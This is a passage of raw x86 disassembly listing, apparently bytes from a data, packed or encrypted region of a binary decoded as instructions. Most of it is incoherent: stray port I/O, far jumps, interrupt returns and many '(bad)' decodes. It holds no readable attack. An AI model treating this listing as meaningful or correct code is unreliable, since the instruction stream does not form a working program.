  418f42:	sub    ebx,DWORD PTR [edx]
  418f44:	jge    0x418f44
  418f46:	push   0xffffffa0
  418f48:	shr    edx,1
  418f4a:	cmp    al,0x6a
  418f4c:	aad    0xe
  418f4e:	ins    DWORD PTR es:[edi],dx
  418f4f:	add    BYTE PTR [eax-0x50],bh
  418f52:	aam    0x84
  418f54:	push   0x10
  418f56:	pusha  
  418f57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f58:	inc    ecx
  418f59:	push   ebx
  418f5a:	out    0x2b,eax
  418f5c:	pop    ecx
  418f5d:	bnd jne 0x418f50
  418f60:	out    dx,al
  418f61:	fsubrp st(5),st
  418f63:	jb     0x418f52
  418f65:	mov    al,0x39
  418f67:	dec    edi
  418f68:	dec    esp
  418f69:	dec    ebp
  418f6a:	or     DWORD PTR [ecx-0x34f315e8],edi
  418f70:	std    
  418f71:	out    dx,eax
  418f72:	dec    di
  418f74:	jp     0x418fe7
  418f76:	out    0xdd,eax
  418f78:	scas   al,BYTE PTR es:[edi]
  418f79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f7a:	xchg   BYTE PTR es:[edi+0x57],ah
  418f7e:	sbb    ah,BYTE PTR [eax-0x71]
  418f81:	cmp    ecx,edi
  418f83:	jns    0x418f3c
  418f85:	or     al,0x85
  418f87:	out    0x79,al
  418f89:	lods   al,BYTE PTR ds:[esi]
  418f8a:	push   es
  418f8b:	int3   
  418f8c:	mov    eax,ds:0x2f5f4a9e
  418f91:	pop    ebp
  418f92:	sbb    al,0x51
  418f94:	aam    0x35
  418f96:	stos   BYTE PTR es:[edi],al
  418f97:	cmovno eax,DWORD PTR ds:0x9339dd5e
  418f9e:	iret   
  418f9f:	push   esi
  418fa0:	iret   
  418fa1:	loopne 0x418fab
  418fa3:	xchg   DWORD PTR [edx-0x391f502c],eax
  418fa9:	out    0x94,al
  418fab:	jns    0x418f76
  418fad:	xor    DWORD PTR ss:[eax+eax*2-0x7e],0x9318f738
  418fb6:	jge    0x419006
  418fb8:	out    dx,eax
  418fb9:	inc    ebp
  418fba:	das    
  418fbb:	outs   dx,BYTE PTR ds:[esi]
  418fbc:	push   esi
  418fbd:	jo     0x419006
  418fbf:	retf   
  418fc0:	outs   dx,BYTE PTR ds:[esi]
  418fc1:	inc    eax
  418fc2:	jecxz  0x418fb0
  418fc4:	cmp    BYTE PTR [edx+0x623b5e62],ch
  418fca:	xor    eax,0xc5e03309
  418fcf:	xor    ebp,eax
  418fd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418fd2:	fmul   DWORD PTR [edi*4-0x10edfea1]
  418fd9:	pop    esp
  418fda:	in     eax,dx
  418fdb:	ffreep st(2)
  418fdd:	mov    ch,0xac
  418fdf:	xor    ecx,esi
  418fe1:	pop    es
  418fe2:	clc    
  418fe3:	add    al,0xae
  418fe5:	lds    ebx,FWORD PTR [edx-0x708ab6ef]
  418feb:	mov    ecx,0x1ae36c5f
  418ff0:	mov    ecx,0x45047aa8
  418ff5:	push   ebx
  418ff6:	mov    ds:0x67ad9343,al
  418ffb:	div    ah
  418ffd:	cdq    
  418ffe:	mov    al,ds:0x8e7e37cf
  419003:	mov    al,0x57
  419005:	out    0x79,al
  419007:	push   0x5b6dfa43
  41900c:	xchg   esp,eax
  41900d:	inc    ebx
  41900e:	loop   0x41900a
  419010:	fwait
  419011:	push   0xc961e40a
  419016:	inc    BYTE PTR [eax]
  419018:	xchg   edx,eax
  419019:	and    BYTE PTR [ebp+0x6a76a5c7],cl
  41901f:	loope  0x418fd5
  419021:	pop    es
  419022:	pop    ebx
  419023:	or     edx,DWORD PTR [eax-0x59]
  419026:	xchg   edx,eax
  419027:	push   esi
  419028:	and    BYTE PTR [edi-0x32],bl
  41902b:	test   eax,0x2f300107
  419030:	inc    esp
  419031:	scas   eax,DWORD PTR es:[edi]
  419032:	mov    dh,0xef
  419034:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419035:	push   edx
  419036:	and    esi,esp
  419038:	nop
  419039:	imul   ebp,DWORD PTR [ebx+0xd],0x23f92a8c
  419040:	xchg   cl,dh
  419042:	ds pop esp
  419044:	push   eax
  419045:	jae    0x4190bb
  419047:	out    0xa,eax
  419049:	push   edi
  41904a:	xchg   DWORD PTR [ecx+ebp*4],ecx
  41904d:	imul   eax,edi,0xa9f2745
  419053:	arpl   si,cx
  419055:	dec    edx
  419056:	test   BYTE PTR [ecx+0x3e2f25da],0xb3
  41905d:	cs arpl bp,cx
  419060:	mov    ah,0xa4
  419062:	xchg   ebx,eax
  419063:	pop    ecx
  419064:	mov    DWORD PTR [ebp-0x4a176272],edx
  41906a:	gs in  al,0x4e
  41906d:	sar    BYTE PTR [ebp-0x51923524],cl
  419073:	push   0xffffffe1
  419075:	and    ch,BYTE PTR [edi-0x536dc83e]
  41907b:	aam    0x53
  41907d:	mov    esi,0x9d69bf55
  419082:	or     dh,BYTE PTR [ebx-0x5a51e1ff]
  419088:	pushf  
  419089:	sub    al,0x8e
  41908b:	(bad)  
  41908c:	aas    
  41908d:	push   ebp
  41908e:	inc    ax
  419090:	retf   
  419091:	int3   
  419092:	into   
  419093:	pop    ecx
  419094:	lods   eax,DWORD PTR ds:[esi]
  419095:	repnz and edx,edx
  419098:	jo     0x41909f
  41909a:	in     eax,0xee
  41909c:	sar    DWORD PTR [esp+edx*4-0x447dc661],0xdc
  4190a4:	xchg   esi,eax
  4190a5:	fistp  WORD PTR [ebp-0x33]
  4190a8:	jno    0x4190f3
  4190aa:	mov    dh,0x67
  4190ac:	xlat   BYTE PTR ds:[ebx]
  4190ad:	stc    
  4190ae:	inc    esi
  4190af:	pop    edi
  4190b0:	add    edi,DWORD PTR [edx]
  4190b2:	xchg   ecx,eax
  4190b3:	mov    ss,WORD PTR [ecx-0x166fe543]
  4190b9:	out    dx,eax
  4190ba:	adc    eax,0xd8d78dfe
  4190bf:	pop    esi
  4190c0:	jne    0x419053
  4190c2:	xor    ah,BYTE PTR [ebp-0x68db6386]
  4190c8:	fisttp QWORD PTR [ebp-0x32]
  4190cb:	jecxz  0x419083
  4190cd:	pop    ebp
  4190ce:	jle    0x41910d
  4190d0:	push   cs
  4190d1:	retf   0xfeb2
  4190d4:	fwait
  4190d5:	xor    dh,BYTE PTR [ebx+0x69cb489e]
  4190db:	mov    eax,ds:0x22b0c871
  4190e0:	scas   eax,DWORD PTR es:[edi]
  4190e1:	cld    
  4190e2:	push   edi
  4190e3:	je     0x4190e1
  4190e5:	call   0xb7b1:0xcd6891ac
  4190ec:	dec    ebx
  4190ed:	pop    ebx
  4190ee:	inc    eax
  4190ef:	ret    0x79f
  4190f2:	retf   
  4190f3:	push   ds
  4190f4:	jb     0x41915a
  4190f6:	(bad)  
  4190f8:	or     eax,DWORD PTR [edi+edi*2+0x4f6e4109]
  4190ff:	out    0x4b,eax
  419101:	enter  0x497a,0x7a
  419105:	inc    ecx
  419106:	lea    esp,[ebp+0xf]
  419109:	ret    
  41910a:	sbb    ecx,DWORD PTR [ecx]
  41910c:	retf   0x9fef
  41910f:	mov    ecx,0x80ca7c18
  419114:	mov    ebp,0x3d2203d4
  419119:	jbe    0x4190fa
  41911b:	mov    dl,0x7
  41911d:	in     eax,dx
  41911e:	leave  
  41911f:	imul   edi,DWORD PTR [edi],0x2e367f39
  419125:	aad    0x86
  419127:	mov    ah,0x7
  419129:	clc    
  41912a:	mov    dh,0x2b
  41912c:	mov    DWORD PTR [edx+ebx*2+0x3571934c],ebp
  419133:	aad    0x64
  419135:	cmp    BYTE PTR ds:0x69943a2c,ch
  41913b:	mov    WORD PTR [edi],?
  41913d:	scas   al,BYTE PTR es:[edi]
  41913e:	rcl    ebx,cl
  419140:	pop    edx
  419141:	or     ah,BYTE PTR [ebx-0x617fbcf8]
  419147:	xchg   esi,eax
  419148:	push   edi
  419149:	push   ss
  41914a:	push   esi
  41914b:	jns    0x419106
  41914d:	mov    al,ds:0x65095888
  419152:	loop   0x4190f0
  419154:	mov    DWORD PTR ds:0x955184e1,esi
  41915a:	loope  0x4190ff
  41915c:	mul    BYTE PTR [edx+0x7d9a733d]
  419162:	(bad)  
  419164:	sub    esp,esi
  419166:	jge    0x5b1660ae
  41916c:	(bad)  
  41916d:	cmp    DWORD PTR [esi],esp
  41916f:	call   0xf626:0xe15706b0
  419176:	lahf   
  419177:	mov    ch,0xcf
  419179:	mov    ?,ebp
  41917b:	pop    ebx
  41917c:	das    
  41917d:	loope  0x419121
  41917f:	jae    0x4191ec
  419181:	add    DWORD PTR [edx],edx
  419183:	xchg   ecx,eax
  419184:	mov    BYTE PTR [ecx],ah
  419186:	jmp    0x41919f
  419188:	inc    ebp
  419189:	push   cs
  41918a:	mov    dh,0x3
  41918c:	mov    BYTE PTR [ebp-0x53],cl
  41918f:	push   eax
  419190:	mov    eax,0x2883ea2a
  419195:	call   0x390f:0x5b16e366
  41919c:	repz and eax,0x87b4f66c
  4191a2:	(bad)  
  4191a3:	(bad)  
  4191a5:	push   esp
  4191a6:	dec    esp
  4191a7:	jo     0x41917f
  4191a9:	out    dx,eax
  4191aa:	or     eax,DWORD PTR [ebx-0x2b]
  4191ad:	push   ss
  4191ae:	pop    edx
  4191af:	mov    al,0x5e
  4191b1:	out    0x2f,al
  4191b3:	ror    BYTE PTR [esi+0x26379802],1
  4191b9:	jno    0x419219
  4191bb:	mov    bh,BYTE PTR [ebx+0x7]
  4191be:	adc    DWORD PTR [ebx-0x4ce021e1],edi
  4191c4:	xchg   DWORD PTR [edi+0x7],ebp
  4191c7:	jo     0x41920c
  4191c9:	mov    ebx,DWORD PTR [ebp-0x5e2abcaf]
  4191cf:	mov    ch,0xc2
  4191d1:	adc    esp,DWORD PTR [edi]
  4191d3:	jge    0x419179
  4191d5:	js     0x419195
  4191d7:	mov    ds:0xfe717905,al
  4191dc:	dec    esp
  4191dd:	xchg   BYTE PTR [eax+0x6da94b95],cl
  4191e3:	pop    ecx
  4191e4:	cld    
  4191e5:	xor    edx,DWORD PTR [eax+0x34]
  4191e8:	hlt    
  4191e9:	into   
  4191ea:	inc    eax
  4191eb:	aad    0x62
  4191ed:	popf   
  4191ee:	stc    
  4191ef:	or     al,0x30
  4191f1:	adc    esi,DWORD PTR [ecx]
  4191f3:	jmp    0x4191eb
  4191f5:	les    ebp,FWORD PTR [edi+edi*1-0x4f]
  4191f9:	dec    edi
  4191fa:	test   eax,0x66b804cc
  4191ff:	xchg   esp,eax
  419200:	mov    edx,0xa5dc6311
  419205:	jmp    0x74583a22
  41920a:	push   0xdf4133c8
  41920f:	mov    edi,0x88ef949b
  419214:	inc    edi
  419215:	loopne 0x419266
  419217:	lods   eax,DWORD PTR ds:[esi]
  419218:	add    ch,BYTE PTR [edx-0x5b8e25b0]
  41921e:	or     eax,0x29d0382a
  419223:	data16 pushw ds
  419226:	idiv   DWORD PTR ds:0x3f9baa10
  41922c:	div    DWORD PTR [ebp+eiz*1+0x728fd573]
  419233:	inc    edx
  419234:	mov    BYTE PTR [esi-0x11],0x69
  419238:	jns    0x41927f
  41923a:	ins    DWORD PTR es:[edi],dx
  41923b:	or     DWORD PTR [esi-0x7],0x186b1f71
  419242:	pop    ebp
  419243:	lock push edi
  419245:	and    DWORD PTR [eax],ebp
  419247:	xor    ch,BYTE PTR [ebx]
  419249:	sub    al,0x59
  41924b:	push   ss
  41924c:	pop    edx
  41924d:	sahf   
  41924e:	mov    esi,0x145b41c
  419253:	push   ebp
  419254:	sbb    BYTE PTR [esi],bh
  419256:	fild   WORD PTR [esi-0x38]
  419259:	ror    DWORD PTR [ebx],cl
  41925b:	adc    BYTE PTR [esi-0xd],0xc5
  41925f:	addr16 xchg ebp,eax
  419261:	das    
  419262:	jne    0x41926e
  419264:	push   edx
  419265:	arpl   WORD PTR [esi],si
  419267:	inc    ecx
  419268:	xchg   ebx,eax
  419269:	dec    DWORD PTR [esi-0x51]
  41926c:	dec    eax
  41926d:	mov    BYTE PTR [ebp+0x3e],0x62
  419271:	call   0xb2d0752d
  419276:	or     DWORD PTR [ebx-0x5a1d1b0b],edi
  41927c:	(bad)  
  41927d:	push   es
  41927e:	sub    esp,esp
  419280:	mov    bh,0x84
  419282:	out    0xaf,al
  419284:	js     0x4192d4
  419286:	repnz mov ch,0xde
  419289:	inc    ecx
  41928a:	scas   al,BYTE PTR es:[edi]
  41928b:	sbb    ch,BYTE PTR [ebx+0x29]
  41928e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41928f:	mov    ebp,esi
  419291:	repz pop esi
  419293:	jns    0x419250
  419295:	int    0x72
  419297:	and    ebx,edi
  419299:	das    
  41929a:	mov    edx,0x2d776d26
  41929f:	or     eax,0x89a2c60
  4192a4:	mov    edx,0xea78364c
  4192a9:	sbb    DWORD PTR [edx+esi*2-0x62],0xfd64c863
  4192b1:	in     eax,0xcc
  4192b3:	jae    0x41927e
  4192b5:	cli    
  4192b6:	xor    BYTE PTR [ebp+0x15],0xdd
  4192ba:	ret    
  4192bb:	jns    0x4192f8
  4192bd:	jp     0x4192ef
  4192bf:	mov    ch,ch
  4192c1:	imul   edx,DWORD PTR [ecx+0x7ffc2a54],0x63
  4192c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4192c9:	enter  0xbd31,0x42
  4192cd:	(bad)  
  4192ce:	jbe    0x419255
  4192d0:	inc    eax
  4192d1:	dec    edi
  4192d2:	neg    ch
  4192d4:	icebp  
  4192d5:	(bad)  
  4192d6:	out    dx,al
  4192d7:	and    BYTE PTR [edi+0x1f072710],0x57
  4192de:	and    bh,BYTE PTR [ebx]
  4192e0:	or     eax,0x3da4e5ae
  4192e5:	mov    bh,0x3c
  4192e7:	ror    BYTE PTR [esp+edx*8],1
  4192ea:	ss inc ecx
  4192ec:	sbb    DWORD PTR [ebp+ecx*2-0x3d7b2c21],0xffffffa0
  4192f4:	and    DWORD PTR [ebx+0x582133aa],eax
  4192fa:	jb     0x41929e
  4192fc:	add    eax,0x7f857d99
  419301:	gs ret 0x4b5
  419305:	nop
  419306:	jmp    0xb0c0:0xf8d7d813
  41930d:	aam    0xd
  41930f:	pop    eax
  419310:	(bad)  
  419311:	adc    dl,cl
  419313:	les    ecx,FWORD PTR [edx-0x14]
  419316:	dec    DWORD PTR [esi+0x665db224]
  41931c:	mov    dh,0xc7
  41931e:	iret   
  41931f:	inc    esp
  419320:	cld    
  419321:	xchg   esi,edi
  419323:	(bad)  
  419324:	pop    ss
  419325:	imul   esp,DWORD PTR [edi+0x27],0xffffffcf
  419329:	cmp    esi,DWORD PTR [esi-0x6537ed06]
  41932f:	jge    0x419338
  419331:	test   BYTE PTR [esi-0x18],bh
  419334:	sub    DWORD PTR [edx-0x66d0bd56],0x843f23e3
  41933e:	jbe    0x419338
  419340:	cli    
  419341:	sub    eax,0x350f09c5
  419346:	jb     0x4192d8
  419348:	hlt    
  419349:	pushf  
  41934a:	mov    ch,0x69
  41934c:	jl     0x419326
  41934e:	daa    
  41934f:	fwait
  419350:	sub    eax,0x612b3ee2
  419355:	xchg   ebp,eax
  419356:	cmovp  eax,DWORD PTR [ebx+ebx*2+0x35d69e5c]
  41935e:	mov    edx,0x74847ba2
  419363:	je     0x4192f4
  419365:	xor    bh,BYTE PTR [ecx]
  419367:	mov    bh,0x55
  419369:	retf   
  41936a:	mov    ecx,DWORD PTR [eax+0x6328ef56]
  419370:	fcomip st,st(6)
  419372:	aad    0x8f
  419374:	repnz mov ebp,0xc93a6fd2
  41937a:	pop    edx
  41937b:	xchg   esp,eax
  41937c:	ret    
  41937d:	imul   edi,DWORD PTR [edx],0x9
  419380:	push   ebp
  419381:	fs jnp 0x41932e
  419384:	or     BYTE PTR [ebp-0x705b0b76],bl
  41938a:	scas   eax,DWORD PTR es:[edi]
  41938b:	scas   eax,DWORD PTR es:[edi]
  41938c:	fld    TBYTE PTR [esi+0x314b2d1f]
  419392:	push   cs
  419393:	enter  0x47bc,0x83
  419397:	fs inc esi
  419399:	into   
  41939a:	push   ebp
  41939b:	pop    edi
  41939c:	sbb    DWORD PTR [eax-0x2d],edi
  41939f:	and    ecx,DWORD PTR [ebx]
  4193a1:	ret    
  4193a2:	(bad)  
  4193a3:	push   ebx
  4193a4:	adc    esi,DWORD PTR [ecx-0x3b8aac78]
  4193aa:	jecxz  0x4193fe
  4193ac:	pop    ebp
  4193ad:	aam    0x58
  4193af:	sbb    al,0xcc
  4193b1:	jp     0x4193a1
  4193b3:	cmp    eax,0x691db947
  4193b8:	sub    bh,BYTE PTR [esi-0x544cff2b]
  4193be:	jg     0x419363
  4193c0:	into   
  4193c1:	clc    
  4193c2:	pop    esp
  4193c3:	xchg   edx,eax
  4193c4:	push   eax
  4193c5:	imul   edi,ebp,0xffffffb4
  4193c8:	sbb    DWORD PTR [edi+eax*2+0x10],esp
  4193cc:	xor    BYTE PTR [esi],al
  4193ce:	loopne 0x4193c8
  4193d0:	mov    ?,WORD PTR [ebx+0x4a]
  4193d3:	cmp    al,0x36
  4193d5:	pop    edi
  4193d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4193d7:	enter  0xc18e,0xd7
  4193db:	mov    edi,0x5ee69fc7
  4193e0:	and    dh,BYTE PTR [edx-0x75ec2526]
  4193e6:	mov    edx,0x8c3c9c71
  4193eb:	fcomp  QWORD PTR [ecx]
  4193ed:	mov    dh,0xbb
  4193ef:	mov    dl,0x5b
  4193f1:	lea    edi,[ebx-0x1b]
  4193f4:	or     dh,BYTE PTR [bx]
  4193f7:	(bad)  [esi+ebp*8]
  4193fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4193fb:	sub    cl,bl
  4193fd:	inc    esp
  4193fe:	xor    cl,cl
  419400:	add    dh,dl
  419402:	mov    ds:0x3c6f4cab,al
  419407:	popa   
  419408:	or     ecx,DWORD PTR [edi-0x13bb32cc]
  41940e:	idiv   DWORD PTR ds:0x8d94e15c
  419414:	dec    eax
  419415:	sahf   
  419416:	sub    ecx,ebx
  419418:	shl    al,0x31
  41941b:	jge    0x4193e1
  41941d:	sbb    al,0x86
  41941f:	push   ebx
  419420:	mov    esp,0x2497d5b7
  419425:	lds    ebx,FWORD PTR [ebx-0x23]
  419428:	sub    eax,0x997caf73
  41942d:	sbb    al,0x7b
  41942f:	iret   
  419430:	pop    edi
  419431:	lods   eax,DWORD PTR ds:[esi]
  419432:	loop   0x419433
  419434:	xchg   edi,eax
  419435:	dec    edx
  419436:	in     al,0x9a
  419438:	(bad)  
  419439:	loop   0x4193df
  41943b:	(bad)  
  41943c:	mov    ebx,0x8ff4326d
  419441:	addr16 or eax,0xc1a93463
  419447:	loope  0x419483
  419449:	setg   BYTE PTR [eax+0x2b]
  41944d:	adc    ecx,DWORD PTR [esi+0x30e87c90]
  419453:	and    al,0x66
  419455:	sub    BYTE PTR [esp+ebx*4+0x3d076569],0x74
  41945d:	cdq    
  41945e:	add    ecx,DWORD PTR cs:[esi+eiz*2+0x74]
  419463:	jl     0x419415
  419465:	push   ds
  419466:	xor    al,0x8d
  419468:	xchg   edx,eax
  419469:	jge    0x4194ca
  41946b:	add    al,0xa7
  41946d:	add    ch,BYTE PTR [ebx+0x6f28579]
  419473:	cmp    eax,0xe48b193b
  419478:	arpl   bp,dx
  41947a:	push   ecx
  41947b:	or     ah,BYTE PTR [esi+0x45]
  41947e:	cmp    ah,BYTE PTR [edx-0x63]
  419481:	jbe    0x41948b
  419483:	and    BYTE PTR [eax],bl
  419485:	scas   al,BYTE PTR es:[edi]
  419486:	mov    al,ds:0x6f95fd35
  41948b:	mov    al,0xca
  41948d:	sub    esp,edx
  41948f:	inc    esp
  419490:	mov    edi,0xfd333ab0
  419495:	jg     0x419431
  419497:	out    dx,eax
  419498:	sbb    bl,al
  41949a:	test   DWORD PTR ds:0x636ff286,0x9ff625a5
  4194a4:	nop
  4194a5:	sbb    BYTE PTR [esi+ebp*8],ah
  4194a8:	repz push ss
  4194aa:	fisub  WORD PTR [ebp-0x30887fca]
  4194b0:	and    al,0xd2
  4194b2:	mov    ebp,0x479fed0d
  4194b7:	fwait
  4194b8:	xor    eax,0x5ac3955c
  4194bd:	ret    0xfee4
  4194c0:	sbb    BYTE PTR [esi+0x6979d2b1],cl
  4194c6:	push   edi
  4194c7:	pop    ss
  4194c8:	and    al,0x71
  4194ca:	cmp    BYTE PTR [edx-0x3cbb4779],dh
  4194d0:	not    BYTE PTR [ebp-0x47]
  4194d3:	loopne 0x419464
  4194d5:	sbb    bh,BYTE PTR [ebx-0x266f921d]
  4194db:	das    
  4194dc:	xchg   ecx,eax
  4194dd:	mov    ch,BYTE PTR [ebx]
  4194df:	mov    edi,0x26fe5cca
  4194e4:	xlat   BYTE PTR ds:[ebx]
  4194e5:	sub    ebx,DWORD PTR [ebp+0x64]
  4194e8:	pop    ss
  4194e9:	jns    0x419482
  4194eb:	or     dl,BYTE PTR [ecx]
  4194ed:	fidiv  DWORD PTR [ebx-0x6d]
  4194f0:	dec    esi
  4194f1:	out    0xa5,al
  4194f3:	retf   
  4194f4:	out    dx,al
  4194f5:	std    
  4194f6:	pop    es
  4194f7:	push   esp
  4194f8:	mov    ah,0x7b
  4194fa:	mov    ebx,eax
  4194fc:	add    bl,BYTE PTR [esi+0x10216b8d]
  419502:	pop    es
  419503:	out    0x42,al
  419505:	call   0xd560:0x5b20d957
  41950c:	inc    edx
  41950d:	les    ebp,FWORD PTR [edi]
  41950f:	mov    edi,0x15037daf
  419514:	xchg   ebx,eax
  419515:	inc    ebp
  419516:	lds    eax,FWORD PTR [esi-0x4f]
  419519:	mov    esp,0x98a58a9e
  41951e:	mov    WORD PTR [ebx],ds
  419520:	cmp    BYTE PTR [edx],cl
  419522:	and    DWORD PTR [ecx+0x2926157],0xffffffd5
  419529:	cld    
  41952a:	xor    DWORD PTR [ebx],esi
  41952c:	sbb    DWORD PTR [eax],edx
  41952e:	in     eax,dx
  41952f:	sar    dh,cl
  419531:	adc    al,0x79
  419533:	mov    BYTE PTR [ebx+0x113f0100],dl
  419539:	(bad)  
  41953a:	icebp  
  41953b:	mov    ebx,0x4156c5f5
  419540:	sahf   
  419541:	push   0xffffffbe
  419543:	jae    0x4194fa
  419545:	xchg   DWORD PTR ds:0x59c180a4,esi
  41954b:	outs   dx,DWORD PTR ds:[esi]
  41954c:	ret    0xac38
  41954f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419550:	cli    
  419551:	sub    al,0x21
  419553:	and    edx,DWORD PTR [eax-0xbc1e602]
  419559:	imul   esp,DWORD PTR [ebx],0x44754923
  41955f:	jge    0x41957d
  419561:	test   BYTE PTR [esp+ebp*4+0x704d0cf0],0x72
  419569:	pop    ebp
  41956a:	jmp    0xff07b490
  41956f:	fistp  WORD PTR [edx+0x0]
  419572:	in     eax,0x65
  419574:	mov    ds,ebp
  419576:	(bad)  
  419577:	aaa    
  419578:	jb     0x41951d
  41957a:	hlt    
  41957b:	adc    eax,DWORD PTR [ebp+0x71]
  41957e:	lock mov gs,esi
  419581:	jmp    ecx
  419583:	aam    0x89
  419585:	sbb    al,0xb1
  419587:	or     ah,cl
  419589:	imul   edx,DWORD PTR [ebx-0x6c9fb6d4],0xffffffca
  419590:	in     eax,dx
  419591:	dec    esi
  419592:	ins    DWORD PTR es:[edi],dx
  419593:	mov    WORD PTR [edi-0x58218572],?
  419599:	fisttp DWORD PTR [esi+0x6cb7392a]
  41959f:	xor    BYTE PTR [eax-0x5e],0x23
  4195a3:	cli    
  4195a4:	ja     0x4195f5
  4195a6:	push   edx
  4195a7:	jbe    0x41956b
  4195a9:	out    dx,al
  4195aa:	adc    ah,ah
  4195ac:	(bad)  
  4195ad:	into   
  4195ae:	push   ss
  4195af:	sahf   
  4195b0:	cli    
  4195b1:	popf   
  4195b2:	push   es
  4195b3:	neg    DWORD PTR [ecx+0x6d3fdbb4]
  4195b9:	cdq    
  4195ba:	ret    0xaac5
  4195bd:	ins    DWORD PTR es:[edi],dx
  4195be:	sbb    BYTE PTR [ebx-0x49],bh
  4195c1:	mov    ah,0x2b
  4195c3:	xchg   edx,eax
  4195c4:	mov    edi,0x305b3f67
  4195c9:	cmp    al,0x33
  4195cb:	cmp    ch,0x58
  4195ce:	pop    edi
  4195cf:	xchg   esi,eax
  4195d0:	jb     0x419609
  4195d2:	xor    esi,DWORD PTR es:0x8a6618a5
  4195d9:	cli    
  4195da:	ret    0xc2fb
  4195dd:	add    esi,DWORD PTR [ebx+esi*4]
  4195e0:	outs   dx,DWORD PTR ds:[esi]
  4195e1:	lahf   
  4195e2:	add    BYTE PTR [edx-0x221d7e79],dl
  4195e8:	xchg   DWORD PTR [ecx+esi*1+0x479cd899],ecx
  4195ef:	mov    dl,0x4e
  4195f1:	dec    esp
  4195f2:	jno    0x4195c2
  4195f4:	(bad)  
  4195f5:	fstp   DWORD PTR [edx]
  4195f7:	out    dx,al
  4195f8:	retf   0x4fcb
  4195fb:	push   ss
  4195fc:	pop    ss
  4195fd:	pop    es
  4195fe:	mov    edx,esi
  419600:	adc    ah,BYTE PTR [ebp+0x7a]
  419603:	inc    eax
  419604:	call   0xf6ff:0x3cae2605
  41960b:	ret    0xc954
  41960e:	xlat   BYTE PTR ds:[ebx]
  41960f:	outs   dx,DWORD PTR ds:[esi]
  419610:	adc    dh,dh
  419612:	loop   0x4195b8
  419614:	inc    esi
  419615:	into   
  419616:	(bad)  
  419617:	cmp    eax,0x9b1ec739
  41961c:	test   DWORD PTR [edi+edx*4+0x23],eax
  419620:	mov    ebx,0xa5bd0ff7
  419625:	cmp    ebx,esi
  419627:	push   0x1d
  419629:	cwde   
  41962a:	sbb    bl,BYTE PTR [esi-0x22]
  41962d:	inc    edx
  41962e:	sar    DWORD PTR [eax+0x3e],1
  419631:	and    eax,0xdba609e5
  419636:	out    0x62,ax
  419639:	inc    ebp
  41963a:	and    BYTE PTR [ebx-0x3c84ea5a],dh
  419640:	fdiv   QWORD PTR [esi-0x174816ca]
  419646:	out    dx,al
  419647:	xchg   edx,eax
  419649:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41964b:	and    DWORD PTR [ebp-0x3fad9c99],0x7dbbb447
  419655:	mov    ebp,0xfcd44b6
  41965a:	enter  0x5286,0x13
  41965e:	aam    0x87
  419660:	mov    ds:0x4159d9b7,eax
  419665:	xchg   ecx,eax
  419666:	in     eax,dx
  419667:	jne    0x4195eb
  419669:	mov    ch,0xc8
  41966b:	mov    ecx,0x26bf675c
  419670:	pop    ecx
  419671:	push   esi
  419672:	push   es
  419673:	pop    edi
  419674:	arpl   ax,cx
  419676:	int    0x9d
  419678:	xchg   esp,eax
  419679:	jb     0x4196a3
  41967b:	aam    0xff
  41967d:	sub    DWORD PTR [esi+0x4],ebp
  419680:	les    edi,FWORD PTR [ecx-0x7d]
  419683:	push   esi
  419684:	iret   
  419685:	mov    ebp,0xc4837ec1
  41968a:	xor    dl,BYTE PTR [ebx+0x5d]
  41968d:	pop    ss
  41968e:	rcr    DWORD PTR [ebp-0x78f4d137],1
  419694:	sbb    ch,BYTE PTR [ecx-0x4e32cbaf]
  41969a:	or     bh,BYTE PTR [ecx]
  41969c:	pop    ebx
  41969d:	cmp    DWORD PTR [eax-0x4],ecx
  4196a0:	push   edx
  4196a1:	mov    edi,0xb31e3552
  4196a6:	imul   edi,eax,0xfb9dbc84
  4196ac:	out    dx,al
  4196ad:	jmp    0x575f4f15
  4196b2:	dec    ecx
  4196b3:	pop    DWORD PTR ds:0xce1fc4dc
  4196b9:	xor    bh,al
  4196bb:	hlt    
  4196bc:	adc    BYTE PTR [edx-0x7b1e2df8],dh
  4196c2:	inc    esp
  4196c3:	push   0x6fef6d37
  4196c8:	xor    al,0xb1
  4196ca:	sahf   
  4196cb:	inc    esp
  4196cc:	popf   
  4196cd:	mov    ecx,DWORD PTR [esi+0x74]
  4196d0:	(bad)  
  4196d1:	cmp    esi,DWORD PTR [edx]
  4196d3:	sub    ecx,esi
  4196d5:	test   DWORD PTR [esi-0x57],ebx
  4196d8:	sbb    dl,BYTE PTR [edx-0x80]
  4196db:	iret   
  4196dc:	scas   eax,DWORD PTR es:[edi]
  4196dd:	dec    esp
  4196de:	sbb    al,0xc2
  4196e0:	sub    ebp,esi
  4196e2:	mov    ds:0x7e84ab65,al
  4196e7:	aas    
  4196e8:	outs   dx,DWORD PTR ds:[esi]
  4196e9:	mov    edx,0x6a8013a6
  4196ee:	mov    ds:0x48488899,eax
  4196f4:	push   eax
  4196f5:	(bad)  
  4196f7:	fistp  QWORD PTR [edi+ebp*4]
  4196fa:	xor    DWORD PTR [edi+0xb94f70d],ecx
  419700:	add    dl,BYTE PTR [ecx+edx*1-0x50]
  419704:	jbe    0x419714
  419706:	hlt    
  419707:	ror    esi,0x88
  41970a:	adc    al,0x86
  41970c:	out    0xbf,eax
  41970e:	push   edx
  41970f:	cmp    ch,BYTE PTR [eax+edx*1-0x56c8d864]
  419716:	(bad)
  419719:	ins    BYTE PTR es:[edi],dx
  41971a:	sahf   
  41971b:	shl    BYTE PTR [esi],cl
  41971d:	in     eax,dx
  41971e:	push   esp
  41971f:	mov    esi,0xaac87af1
  419724:	sti    
  419725:	test   eax,esp
  419727:	mov    edx,es
  419729:	and    edi,DWORD PTR ds:0x1afc813e
  41972f:	push   esp
  419730:	xchg   edi,eax
  419731:	or     DWORD PTR [ecx],edx
  419733:	lahf   
  419734:	adc    esp,esi
  419736:	and    BYTE PTR [edi],ah
  419738:	jmp    0xa7b5c728
  41973d:	fbstp  TBYTE PTR [eax+0x30]
  419740:	or     dl,BYTE PTR [eax]
  419742:	xchg   ebx,eax
  419743:	or     ch,BYTE PTR [edx-0x8f510f6]
